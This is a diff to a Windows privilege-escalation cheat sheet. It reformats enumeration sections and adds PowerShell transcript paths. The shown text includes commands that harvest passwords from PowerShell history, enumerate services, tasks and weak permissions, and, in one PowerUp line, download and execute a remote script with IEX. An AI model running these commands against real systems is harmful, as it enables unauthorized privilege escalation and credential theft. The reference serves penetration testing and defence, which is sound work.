@@ -21,7 +21,8 @@
     * [Wifi passwords](#wifi-passwords)
     * [Sticky Notes passwords](#sticky-notes-passwords)
     * [Passwords stored in services](#passwords-stored-in-services)
-    * [Powershell history](#powershell-history)
+    * [Powershell History](#powershell-history)
+    * [Powershell Transcript](#powershell-transcript)
     * [Password in Alternate Data Stream](#password-in-alternate-data-stream)
 * [EoP - Processes Enumeration and Tasks](#eop---processes-enumeration-and-tasks)
 * [EoP - Incorrect permissions in services](#eop---incorrect-permissions-in-services)
@@ -102,6 +103,7 @@
     ```powershell
     C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
     C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
+    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML"
     ```
 
 ## Windows Version and Configuration
@@ -537,7 +539,7 @@ Invoke-SessionGopher -AllDomain -o
 Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
 
-### Powershell history
+### Powershell History
 
 ```powershell
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
@@ -545,6 +547,13 @@ type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Co
 type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 cat (Get-PSReadlineOption).HistorySavePath
 cat (Get-PSReadlineOption).HistorySavePath | sls passw
+```
+
+### Powershell Transcript
+
+```xml
+C:\Users\<USERNAME>\Documents\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
+C:\Transcripts\<DATE>\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
 ```
 
 ### Password in Alternate Data Stream
@@ -556,62 +565,55 @@ PS > Get-Content -path flag.txt -Stream Flag
 
 ## EoP - Processes Enumeration and Tasks
 
-What processes are running?
+* What processes are running?
+    ```powershell
+    tasklist /v
+    net start
+    sc query
+    Get-Service
+    Get-Process
+    Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
+    ```
 
-```powershell
-tasklist /v
-net start
-sc query
-Get-Service
-Get-Process
-Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
-```
+* Which processes are running as "system"
+    ```powershell
+    tasklist /v /fi "username eq system"
+    ```
 
-Which processes are running as "system"
+* Do you have powershell magic?
+    ```powershell
+    REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
+    ```
 
-```powershell
-tasklist /v /fi "username eq system"
-```
+* List installed programs
+    ```powershell
+    Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
+    Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
+    ```
 
-Do you have powershell magic?
+* List services
+    ```powershell
+    net start
+    wmic service list brief
+    tasklist /SVC
+    ```
 
-```powershell
-REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
-```
+* Enumerate scheduled tasks
+    ```powershell
+    schtasks /query /fo LIST 2>nul | findstr TaskName
+    schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
+    Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+    ```
 
-List installed programs
-
-```powershell
-Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
-Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
-```
-
-List services
-
-```powershell
-net start
-wmic service list brief
-tasklist /SVC
-```
-
-Scheduled tasks
-
-```powershell
-schtasks /query /fo LIST 2>nul | findstr TaskName
-schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
-Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
-```
-
-Startup tasks
-
-```powershell
-wmic startup get caption,command
-reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
-reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
-dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
-dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
-```
+* Startup tasks
+    ```powershell
+    wmic startup get caption,command
+    reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
+    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+    dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
+    dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
+    ```
 
 ## EoP - Incorrect permissions in services
 
@@ -641,17 +643,16 @@ Often, services are pointing to writeable locations:
     ```
 
 - PATH directories with weak permissions
+    ```powershell
+    $ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
+    $ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
 
-```powershell
-$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
-$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
-
-$ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
-FOR /F %i in (Servicenames.txt) DO echo %i
-type Servicenames.txt
-FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
-FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
-```
+    $ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
+    FOR /F %i in (Servicenames.txt) DO echo %i
+    type Servicenames.txt
+    FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
+    FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
+    ```
 
 Alternatively you can use the Metasploit exploit : `exploit/windows/local/service_permissions`
 
@@ -769,7 +770,6 @@ gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Whe
 
 * Metasploit exploit : `exploit/windows/local/trusted_service_path`
 * PowerUp exploit
-
     ```powershell
     # find the vulnerable application
     C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
@@ -832,7 +832,7 @@ Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c
 
 Check if these registry values are set to "1".
 
-```bat
+```powershell
 $ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 $ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
